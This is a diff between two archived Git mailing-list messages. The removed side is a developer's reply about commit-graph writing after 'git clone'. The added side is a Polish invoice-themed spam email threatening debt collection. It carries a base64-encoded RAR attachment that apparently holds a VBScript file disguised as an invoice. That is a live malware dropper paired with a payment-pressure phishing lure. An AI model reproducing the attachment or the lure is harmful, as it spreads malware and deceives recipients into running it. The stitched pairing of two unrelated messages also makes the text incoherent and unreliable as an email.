@@ -2,151 +2,96 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.7 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
-	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
-	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
+X-Spam-Status: No, score=0.4 required=3.0 tests=BAYES_00,
+	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI,
+	SUBJ_ALL_CAPS,UNWANTED_LANGUAGE_BODY shortcircuit=no autolearn=no
+	autolearn_force=no version=3.4.1
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 3B2681F453
-	for <e@80x24.org>; Fri,  5 Oct 2018 12:06:00 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 4A0951F453
+	for <e@80x24.org>; Fri,  5 Oct 2018 12:08:11 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1728314AbeJETEZ (ORCPT <rfc822;e@80x24.org>);
-        Fri, 5 Oct 2018 15:04:25 -0400
-Received: from mail-qt1-f196.google.com ([209.85.160.196]:35769 "EHLO
-        mail-qt1-f196.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1727558AbeJETEZ (ORCPT <rfc822;git@vger.kernel.org>);
-        Fri, 5 Oct 2018 15:04:25 -0400
-Received: by mail-qt1-f196.google.com with SMTP id v19-v6so13475181qtg.2
-        for <git@vger.kernel.org>; Fri, 05 Oct 2018 05:05:58 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=subject:to:cc:references:from:message-id:date:user-agent
-         :mime-version:in-reply-to:content-transfer-encoding:content-language;
-        bh=iXLi30PyoW7CKafwVAfNRl45pbPg7sSq2uW56n80arw=;
-        b=ZBk5zTqSRtF4z+tsv0uCfezeqxN7pMnswstlUf6aZKIW/7/8CZcv1svj8L0e3eLlJI
-         sCPMHdRHQTHye7fWlWcEj6P1QWbuXQzJgB2xnefnWm9x+dQ/z/MRTJy64Wa1bArZ7BTq
-         Wy+vSVzwbrK+023vkrKuAqAS/kta4Mqr17dAp0fzsYb32wfGRIrgHA4kDAis7JGMkcoy
-         0VRSHRt7nfi9JgTiQRGScLYBsxn0T5DMUuT+FAqh9T0zQYh9EVkWbBR6wqglYb/6rVcJ
-         7gviWlleD0L6qK9y9+DDfy0JhEM6p4iH8pxjZ3zVC2pShNgTYhJgj88KXGRSW/Iu054M
-         uNig==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:subject:to:cc:references:from:message-id:date
-         :user-agent:mime-version:in-reply-to:content-transfer-encoding
-         :content-language;
-        bh=iXLi30PyoW7CKafwVAfNRl45pbPg7sSq2uW56n80arw=;
-        b=VD7FpohEsIo6n5ETo4Q4c9l2qHAr1SxL9gjYhjq6v3xeTAYkp8wuY11noSVSo3Z1A5
-         Mo6rGnDPoVilztcUnw57AUWx8r0+m4b+YuXgcTtwv8SJGkNOdQj9UTRHCIi5mTyST9b/
-         /1qy2MHFL923/J4Cx7qUBgJT8zt1OcYPfyMkD+S+m/+OtZur2jUEAJull75AEuAz4k/E
-         ibjpJYnwLjy8cjZWSBDoxIkt5fciWhYJGWb+6H8Xyy/DrU9NLjzv7i1Yjko9xb+B0/CC
-         Rj1aik7DWx3cPo36USLZpBOwmhm8WJrAYJqBzz8F6vo1yF2DAPtEQrMPqlwlw60oPWGt
-         DhtA==
-X-Gm-Message-State: ABuFfoh6VTl0+Gh4F79Pg8yXENT6AsmbcnCGiMnhtt9SyoSvIEnDm6Nt
-        VE/W2Zu3icHkwObHbxwIh0Q=
-X-Google-Smtp-Source: ACcGV600WI4v2XAjgFPwcosPS6XK2jZck7kuBZCI0U2Z9FU5mDTrwG0lPFUEwpbXnwD8hzpjBQDbuw==
-X-Received: by 2002:ac8:2278:: with SMTP id p53-v6mr8547836qtp.200.1538741157493;
-        Fri, 05 Oct 2018 05:05:57 -0700 (PDT)
-Received: from [10.0.1.23] ([98.122.163.216])
-        by smtp.gmail.com with ESMTPSA id u18-v6sm4364291qtb.63.2018.10.05.05.05.56
-        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
-        Fri, 05 Oct 2018 05:05:56 -0700 (PDT)
-Subject: Re: [RFC PATCH] We should add a "git gc --auto" after "git clone" due
- to commit graph
-To:     =?UTF-8?B?w4Z2YXIgQXJuZmrDtnLDsCBCamFybWFzb24=?= <avarab@gmail.com>
-Cc:     Git List <git@vger.kernel.org>,
-        =?UTF-8?B?Tmd1eeG7hW4gVGjDoWkgTmfhu41j?= =?UTF-8?Q?_Duy?= 
-        <pclouds@gmail.com>,
-        =?UTF-8?Q?SZEDER_G=c3=a1bor?= <szeder.dev@gmail.com>,
-        Jeff King <peff@peff.net>, Stefan Beller <sbeller@google.com>
-References: <87tvm3go42.fsf@evledraar.gmail.com>
- <87in2hgzin.fsf@evledraar.gmail.com>
-From:   Derrick Stolee <stolee@gmail.com>
-Message-ID: <dcb8f115-ce3c-64fa-50cc-dd03569c0164@gmail.com>
-Date:   Fri, 5 Oct 2018 08:05:55 -0400
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101
- Thunderbird/60.0
+        id S1728348AbeJETGg (ORCPT <rfc822;e@80x24.org>);
+        Fri, 5 Oct 2018 15:06:36 -0400
+Received: from shared-amj106.rev.nazwa.pl ([85.128.192.106]:19987 "EHLO
+        shared-amj106.rev.nazwa.pl" rhost-flags-OK-OK-OK-OK)
+        by vger.kernel.org with ESMTP id S1727666AbeJETGg (ORCPT
+        <rfc822;git@vger.kernel.org>); Fri, 5 Oct 2018 15:06:36 -0400
+X-Greylist: delayed 472 seconds by postgrey-1.27 at vger.kernel.org; Fri, 05 Oct 2018 15:06:35 EDT
+X-Virus-Scanned: by amavisd-new using ClamAV (10)
+Received: from cccxxxggdfg (unknown [37.48.96.243])
+        by edred.nazwa.pl (Postfix) with ESMTP id 5D9A443F0E1
+        for <git@vger.kernel.org>; Fri,  5 Oct 2018 14:00:16 +0200 (CEST)
+From:   "Joanna Kwiatkowska" <biuro@edred.nazwa.pl>
+Subject: FV_VAT 181004_3369
+To:     "git" <git@vger.kernel.org>
+Content-Type: multipart/mixed; boundary="3C29KpRdEXBA7RET=_SNTL41YlQ4IQbpXG"
 MIME-Version: 1.0
-In-Reply-To: <87in2hgzin.fsf@evledraar.gmail.com>
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 8bit
-Content-Language: en-US
+Reply-To: "Joanna Kwiatkowska" <biuro1@edred.nazwa.pl>
+Organization: "Amiga"
+Date:   Fri, 5 Oct 2018 13:00:15 +0100
+Message-Id: <20181005120016.5D9A443F0E1@edred.nazwa.pl>
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On 10/4/2018 5:42 PM, Ævar Arnfjörð Bjarmason wrote:
-> I don't have time to polish this up for submission now, but here's a WIP
-> patch that implements this, highlights:
->
->   * There's a gc.clone.autoDetach=false default setting which overrides
->     gc.autoDetach if 'git gc --auto' is run via git-clone (we just pass a
->     --cloning option to indicate this).
+This is a multi-part message in MIME format
 
-I'll repeat that it could make sense to do the same thing on clone _and_ 
-fetch. Perhaps a "--post-fetch" flag would be good here to communicate 
-that we just downloaded a pack from a remote.
+--3C29KpRdEXBA7RET=_SNTL41YlQ4IQbpXG
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
 
->   * A clone of say git.git with gc.writeCommitGraph=true looks like:
->
->     [...]
->     Receiving objects: 100% (255262/255262), 100.49 MiB | 17.78 MiB/s, done.
->     Resolving deltas: 100% (188947/188947), done.
->     Computing commit graph generation numbers: 100% (55210/55210), done.
+Witam
 
-This looks like good UX. Thanks for the progress here!
+Na dzie=C5=84 dzisiejszy nie odnotowali=C5=9Bmy wp=C5=82aty za faktury=
+ kt=C3=B3rych zestawienie przesy=C5=82am w za=C5=82=C4=85czeniu. Je=C5=
+=BCeli nale=C5=BCno=C5=9Bci zosta=C5=82y uregulowane prosz=C4=99 uzna=C4=
+=87=20
+powy=C5=BCsz=C4=85 wiadomo=C5=9B=C4=87 za niewa=C5=BCn=C4=85. W przypa=
+dku nieuregulowania p=C5=82atno=C5=9Bci w terminie 7 dni od dnia=20
 
->   * The 'git gc --auto' command also knows to (only) run the commit-graph
->     (and space is left for future optimization steps) if general GC isn't
->     needed, but we need "optimization":
->
->     $ rm .git/objects/info/commit-graph; ~/g/git/git --exec-path=$PWD -c gc.writeCommitGraph=true -c gc.autoDetach=false gc --auto;
->     Annotating commits in commit graph: 341229, done.
->     Computing commit graph generation numbers: 100% (165969/165969), done.
->     $
+otrzymania tej wiadomo=C5=9Bci, sprawa mo=C5=BCe zosta=C4=87 skierowan=
+a do windykacji.
 
-Will this also trigger a full commit-graph rewrite on every 'git commit' 
-command? Or is there some way we can compute the staleness of the 
-commit-graph in order to only update if we get too far ahead? 
-Previously, this was solved by relying on the auto-GC threshold.
 
->   * The patch to gc.c looks less scary with -w, most of it is indenting
->     the existing pack-refs etc. with a "!auto_gc || should_gc" condition.
->
->   * I added a commit_graph_exists() exists function and only care if I
->     get ENOENT for the purposes of this gc mode. This would need to be
->     tweaked for the incremental mode Derrick talks about, but if we just
->     set "should_optimize" that'll also work as far as gc --auto is
->     concerned (e.g. on fetch, am etc.)
 
-The incremental mode would operate the same as split-index, which means 
-we will still look for .git/objects/info/commit-graph. That file may 
-point us to more files.
+Pozdrawiam,
 
-> +int commit_graph_exists(const char *graph_file)
-> +{
-> +	struct stat st;
-> +	if (stat(graph_file, &st)) {
-> +		if (errno == ENOENT)
-> +			return 0;
-> +		else
-> +			return -1;
-> +	}
-> +	return 1;
-> +}
-> +
+Joanna Kwiatkowska
 
-This method serves a very similar purpose to 
-generation_numbers_enabled(), except your method only cares about the 
-file existing. It ignores information like `core.commitGraph`, which 
-should keep us from doing anything with the commit-graph file if false.
+Kwantor Sp. z o.o.=20
 
-Nothing about your method is specific to the commit-graph file, since 
-you provide a filename as a parameter. It could easily be "int 
-file_exists(const char *filename)".
 
-Thanks,
+--3C29KpRdEXBA7RET=_SNTL41YlQ4IQbpXG
+Content-Type: application/octet-stream;
+	name="faktura181004_131966txt.rar"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="faktura181004_131966txt.rar"
 
--Stolee
+UmFyIRoHAQDz4YLrCwEFBwAGAQGAgIAA0/XdCjcCAwvsCASOGCCYVqkfgAMAG2Zha3R1cmExODEw
+MDRfMTMxOTY2dHh0LnZicwoDAnj124RCXNQByf9oBEBkQzI0XzYFXuZ4UqfRKc4SiMZPzvKqc5T2
+QJu7AkDjOTdretDagOH4b1pE0D3xzS8bJI2wZU8QQDEsV5mXixLE/Hsy8WLP79lX13V19WeIPP5T
+f/gyHb8XdVzS3FEfTxGuwJxIydx8SM8WRIx386vrdbCWDILHLOfUiL86vQF7tCKB5DreP+AwfSJG
+Y9t458zyakjX8APqAKzfTsZ+6eE/aMo5AwwiGhwJbuPvPFiqdZDg4w/dSk+AAVnDDn55uk2bPrKn
+u+iQLtcvMzz8vOvUqWs+Z1T8GYxvnpST/fa3b+wWzpaY4ai0jZSAfl5Ptgn3qhve8TEoDSGWQeze
+zM3jWIOEXeE1mKIHQ3/IER5QYdyNCtfCwgUM9Blf1IlwzdH5PN/MpiIXv6scJqpq4Lk7S8WfM1Qx
+OWeGqvxugkKOClWhxQ/6+EXT0c3Qy1ycHBBCrpXNK7KJmntz40OWC0129R/iLfJHixH/5Y8cka6r
+3mjU8dtzG/DTyQte/NwbQRP427j+ZJ5RGsu6sl08QyNLd64BgTYUMTtuCJEyRQkxJwcYXX4jTP3x
+oX5o8csaknc7IIGIgV4RjSi+UDbDrSRHQ5g9zXXr8TLIMzTQ/FeN63+Sx6Fjkj4eCSUHIsOMZ81m
+03oeb2zFTw7zx45o110tSQo4hU+jwUK9QNYkx34PJAZDC9x90KqYPFVb8XLf0v37okatPUVu+FAb
+a/YvVXs3ylliUqFP98fGkTyFiAL+l8ehsRVnYMqdl7jsNV2rBfSV7QCpl5m0G8DeEQWGn6bS4IzU
+R5UiYBTfdwHJ+EG1zIhEJq7LIWevwAJKtN7DrHqGma1Prd0R4542299OMb2R8FYvXKbayaosVcgQ
+35foMIGWJH64jdeqymE+YNi8gLg6LdTwYYgAIY6GdGh5OgKPdCVaXEpcU6F1QjX+uMuUAk8wJVod
+BMhKKfc1/iHOyT5gjWRWmqnrPqSe8r1mzPzg5TPa57W3EplvQoRsRROYk3iKBfry+oKKeUW3Sjm0
+emLHCWo/7Fqz0GGF8FUt0q9AI1HK/yarWKzTPPWri9RB144DCLzRlOHfHzCOD+sl18R66hejtO6I
+0EKtlD4KqrwixKtlU0yxJ+3PC4PsIcL58AMo2jIVvGfpx0jMm98/U4qJiYgqmKCN4WrsT+V8dm75
+7zc4vFaj6KFyjWijqz/S1CpVNOfC/AW8sf2XKnMfKhdZamI/bBd7x8cRjigc8ZpGo6d7Cx/Ddnfe
+SCAfIB+U9y7LKR2S2s6EO5yhteQ9UOilj5F6QxZNPKWfSjkaX18TMUaeGmWQyL+IccSwaUHdyOyD
+zAV9xt64GGj1WrI5B+0aLbUDmk4ck3qfp33TWkpSak9hU00aAnLxUWoYyMbMr+201oMnKIE6xPy+
+GKGZ3QfviN54LYdWGTHIUbh411w742fM+DTaESIcAayUVJbtH0XXd56Vn3xDnFM2/v8HsS7qkt0M
+i0uT1DrBt+oUBhU39AsSiN4VAB13VlEDBQQA
 
+--3C29KpRdEXBA7RET=_SNTL41YlQ4IQbpXG--
 
